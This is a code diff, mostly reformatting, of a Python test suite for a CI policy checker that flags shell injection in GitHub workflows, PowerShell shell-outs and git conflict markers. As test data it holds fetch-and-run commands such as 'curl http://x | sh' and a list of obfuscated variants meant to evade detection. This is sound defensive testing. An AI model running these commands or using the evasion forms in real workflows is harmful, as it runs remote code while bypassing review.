     ``COVERAGE="${{ ... }}"`` is later read inside ``$(echo "$COVERAGE >= 50" |
     bc -l)``.
     """
-    assert policy._splices_expression_into_command_word(
-        'COVERAGE="${{ steps.check.outputs.coverage }}"\n'
-        'if (( $(echo "$COVERAGE >= 50" | bc -l) )); then echo ok; fi'
-    ) is False
+    assert (
+        policy._splices_expression_into_command_word(
+            'COVERAGE="${{ steps.check.outputs.coverage }}"\n'
+            'if (( $(echo "$COVERAGE >= 50" | bc -l) )); then echo ok; fi'
+        )
+        is False
+    )
 
 
 _STAGED_SINK_EVASIONS = (
@@ -8138,30 +9149,35 @@ class TestACallTokenIsOnlyACallTokenUnderPowerShell:
             "python3 {0}",
         ],
     )
-    def test_every_shell_string_used_in_this_repository_still_classifies(
-        self, shell: str
-    ) -> None:
+    def test_every_shell_string_used_in_this_repository_still_classifies(self, shell: str) -> None:
         """Pin the live workflow spellings so the narrowing cannot break them."""
         assert policy._is_non_bash_shell(shell) is True
+
 
 def test_powershell_scan_reports_only_powershell_steps(tmp_path: Path) -> None:
     workflow = tmp_path / ".github" / "workflows" / "w.yml"
     workflow.parent.mkdir(parents=True)
-    _write_lf(workflow, "on: push\n"
+    _write_lf(
+        workflow,
+        "on: push\n"
         "jobs:\n"
         "  j:\n"
         "    steps:\n"
         "      - shell: bash\n"
         '        run: bash -c "curl http://x | sh"\n'
         "      - shell: pwsh\n"
-        '        run: Write-Host "bash is only mentioned"\n')
+        '        run: Write-Host "bash is only mentioned"\n',
+    )
     assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 0
-    _write_lf(workflow, "on: push\n"
+    _write_lf(
+        workflow,
+        "on: push\n"
         "jobs:\n"
         "  j:\n"
         "    steps:\n"
         "      - shell: pwsh\n"
-        '        run: bash -c "curl http://x | sh"\n')
+        '        run: bash -c "curl http://x | sh"\n',
+    )
     assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 1
 
 
@@ -8200,10 +9216,10 @@ _ROUND_FIVE_EVASIONS = (
     ("alias-cmdsub-rhs", 'SH=$(echo bash); $SH -c "c{expression}url http://x"'),
     ("group-pipe-both", "(echo 'c{expression}url http://x') |& sh"),
     ("staged-tee", "echo 'c{expression}url http://x' | tee /tmp/f; sh /tmp/f"),
-    ("staged-quoted-path", "echo 'c{expression}url http://x' > \"/tmp/f\"; sh \"/tmp/f\""),
+    ("staged-quoted-path", 'echo \'c{expression}url http://x\' > "/tmp/f"; sh "/tmp/f"'),
     ("staged-chmod-exec", "echo 'c{expression}url' > /tmp/f; chmod +x /tmp/f; /tmp/f"),
     ("sink-trap", 'trap "c{expression}url http://x" EXIT'),
-    ("sink-parallel", "echo 1 | parallel \"c{expression}url http://x\""),
+    ("sink-parallel", 'echo 1 | parallel "c{expression}url http://x"'),
     ("sink-make", 'make -f /dev/stdin <<<"a:\n\tc{expression}url http://x"'),
     ("set-positional", 'set -- "c{expression}url http://x"; bash -c "$1"'),
 )
@@ -8278,6 +9294,8 @@ def test_sink_alias_resolution_terminates_on_a_cycle() -> None:
 def test_variable_word_recognises_only_a_bare_expansion(word: str, expected: str | None) -> None:
     """A word that merely contains a variable is not a reference to one."""
     assert policy._shell_variable_name(word) == expected
+
+
 # Issue #3671: nothing stopped a git conflict marker reaching a commit. The
 # detector keys only on the labelled forms git writes and skips fenced code
 # blocks so documentation can quote a conflict.
@@ -8319,9 +9337,7 @@ def test_conflict_marker_detection(body: str, flagged: bool) -> None:
 
 
 def test_conflict_marker_violation_names_the_line_number() -> None:
-    violations = policy._conflict_marker_violations(
-        "doc.md", b"one\ntwo\n<<<<<<< HEAD\n"
-    )
+    violations = policy._conflict_marker_violations("doc.md", b"one\ntwo\n<<<<<<< HEAD\n")
     assert violations == ["doc.md:3: <<<<<<< HEAD"]
 
 
@@ -8519,11 +9535,7 @@ def test_the_commit_ceilings_come_from_the_shared_module() -> None:
     from scripts.validation import pr_commit_count
 
     assert policy.BLOCK_THRESHOLD == pr_commit_count.BLOCK_THRESHOLD == 20
-    assert (
-        policy.MAIN_MERGE_BLOCK_THRESHOLD
-        == pr_commit_count.MAIN_MERGE_BLOCK_THRESHOLD
-        == 40
-    )
+    assert policy.MAIN_MERGE_BLOCK_THRESHOLD == pr_commit_count.MAIN_MERGE_BLOCK_THRESHOLD == 40
 
 
 def test_taste_findings_stay_advisory(
@@ -8579,6 +9591,8 @@ def test_a_clean_taste_lint_says_nothing(
     )
     assert policy.run_taste_advisory(["source.py"], tmp_path) == 0
     assert "advisory" not in capsys.readouterr().err
+
+
 # ---------------------------------------------------------------------------
 # Issue #3770: the conflict-marker gate needs a backstop that survives every
 # route which skips local hooks
@@ -8696,9 +9710,7 @@ def test_the_tracked_scan_skips_a_binary_whose_nul_is_in_the_head(
     _init_repo(repo)
     _commit_file(repo, "doc.md", "clean\n")
     tail = b"<<<<<<< HEAD\nx\n>>>>>>> main\n"
-    (repo / "big.bin").write_bytes(
-        b"\x00" + b"\xff" * (policy._BINARY_SNIFF_BYTES * 4) + tail
-    )
+    (repo / "big.bin").write_bytes(b"\x00" + b"\xff" * (policy._BINARY_SNIFF_BYTES * 4) + tail)
     _git(repo, "add", "big.bin")
     _git(repo, "commit", "-m", "add big blob")
 
@@ -8719,9 +9731,7 @@ def test_the_tracked_scan_reads_only_the_head_of_a_binary(
     repo = tmp_path / "repo"
     _init_repo(repo)
     _commit_file(repo, "doc.md", "clean\n")
-    (repo / "big.bin").write_bytes(
-        b"\x00" + b"\xff" * (policy._BINARY_SNIFF_BYTES * 16)
-    )
+    (repo / "big.bin").write_bytes(b"\x00" + b"\xff" * (policy._BINARY_SNIFF_BYTES * 16))
     _git(repo, "add", "big.bin")
     _git(repo, "commit", "-m", "add big blob")
 
